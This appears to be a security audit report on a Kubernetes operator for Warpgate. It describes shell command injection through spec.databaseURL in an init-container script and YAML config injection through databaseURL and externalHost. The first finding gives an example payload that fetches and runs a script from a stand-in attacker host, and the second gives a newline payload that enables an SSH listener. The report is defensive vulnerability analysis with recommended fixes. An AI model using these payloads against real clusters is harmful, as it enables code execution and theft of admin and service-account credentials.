summary: Reviewed the warpgate-operator Go sources under internal/ (warpgate API client + controllers), cmd/main.go, and api/v1alpha1 (types and admission webhooks). The operator is a Kubernetes controller that reconciles WarpgateInstance/Connection/Target/User/Ticket/etc. CRs against a Warpgate admin API. The most significant issue is that the WarpgateInstance reconciler builds a `/bin/sh -c` init script by string-concatenating unvalidated CR spec fields (notably spec.databaseURL), yielding shell command injection into the instance pod; the same untrusted fields are also injected unescaped into the generated warpgate.yaml. Credential/secret handling, TLS defaults, and the API client are otherwise reasonable. Coverage was the non-test Go files listed below; test files were only skimmed.

findings.title: Shell command injection via spec.databaseURL in WarpgateInstance init script
findings.description: buildDeployment assembles an init-container command as a single `/bin/sh -c <script>` string (see Command at line 776). User-controlled WarpgateInstance spec fields are concatenated into that script without any shell escaping. spec.databaseURL is inserted as `--database-url "<value>"` at line 557; the admission webhook (validateWarpgateInstance) performs no content validation on databaseURL (it only emits a warning), so a principal allowed to create/update a WarpgateInstance CR can set databaseURL to e.g. `x"; wget http://attacker/x -O /tmp/x; sh /tmp/x; echo "` and achieve arbitrary command execution inside the Warpgate instance pod. That pod has the admin password wired in as the ADMIN_PASSWORD env var and mounts the pod's ServiceAccount token, so injection leaks the Warpgate admin credential and the pod's Kubernetes identity — an escalation beyond what merely creating an instance grants. The same concatenation pattern applies to other spec-derived fragments in this block, but databaseURL is the clearest attacker-controlled free-text sink.
findings.evidence: Line 549-558: setupCmd := fmt.Sprintf(`warpgate ... --admin-password "${ADMIN_PASSWORD}"`, ...); if inst.Spec.DatabaseURL != "" { setupCmd += fmt.Sprintf(` --database-url "%s"`, inst.Spec.DatabaseURL) }. Line 570: scriptParts append fmt.Sprintf("  %s", setupCmd). Line 611: initScript := strings.Join(scriptParts, "\n"). Line 776: Command: []string{"/bin/sh", "-c", initScript}. Source: WarpgateInstanceSpec.DatabaseURL (api/v1alpha1/warpgateinstance_types.go:86), a free-form string with no validation in warpgateinstance_webhook.go.
findings.recommendation: Do not build the shell command by interpolating spec values. Pass user-controlled values as argv elements (e.g. exec `warpgate ...` with the database URL as a discrete arg, or via an env var referenced as "$DATABASE_URL" that the shell expands but does not re-parse) instead of embedding them in the script text. At minimum, strictly validate databaseURL (and externalHost, storage size, etc.) against an allow-list/regex in the validating webhook and reject shell metacharacters.

findings.title: YAML config injection via spec.databaseURL / spec.externalHost in generated warpgate.yaml
findings.description:
buildWarpgateConfig produces warpgate.yaml by fmt.Fprintf-ing raw spec strings into the document. spec.databaseURL is written as `database_url: "<value>"` (line 345) and spec.externalHost as `external_host: <value>` (line 380), with no escaping and no webhook validation. A value containing a newline (e.g. externalHost = "h
ssh:
  enable: true
  listen: "0.0.0.0:2222"") lets a WarpgateInstance author inject or override arbitrary top-level Warpgate configuration keys. This ConfigMap is copied to /data/warpgate.yaml and consumed by the running instance (line 587), so injected keys take effect and can weaken the instance's security posture (e.g. enabling listeners or altering auth-related settings). Same root cause as the command-injection finding — unvalidated free-text spec fields — but a distinct sink (the config file) with a different fix.
findings.evidence: Line 344-345: if inst.Spec.DatabaseURL != "" { fmt.Fprintf(&b, "database_url: \"%s\"\n", inst.Spec.DatabaseURL) }. Line 379-381: if inst.Spec.ExternalHost != "" { fmt.Fprintf(&b, "external_host: %s\n", inst.Spec.ExternalHost) }. Rendered config is stored in the ConfigMap (ensureConfigMap, line 401-403) and copied over /data/warpgate.yaml by the init script (line 587).
findings.recommendation: Serialize the config with a real YAML encoder (e.g. sigs.k8s.io/yaml or gopkg.in/yaml.v3) from a typed struct/map rather than hand-formatting strings, so values are properly quoted/escaped. Additionally validate externalHost (hostname) and databaseURL (URL scheme/format) in the validating webhook and reject embedded newlines.
